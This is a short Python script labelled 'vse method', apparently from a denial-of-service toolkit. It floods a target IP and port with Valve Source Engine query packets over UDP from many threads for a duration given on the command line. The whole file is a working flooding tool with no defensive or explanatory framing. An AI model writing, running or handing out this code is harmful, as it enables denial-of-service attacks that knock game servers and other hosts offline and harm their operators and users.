
# vse method

import socket, time, random, threading
from sys import argv
from threading import Thread

def vse(ip, port, floodtime):
	payload = b'\xff\xff\xff\xffTSource Engine Query\x00'
	while time.time() < floodtime:
		with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
			sock.sendto(payload, (ip, port))


for _ in range(int(argv[4])):
	Thread(target=vse, args=(str(argv[1]), int(argv[2]), time.time() + int(argv[3]))).start()

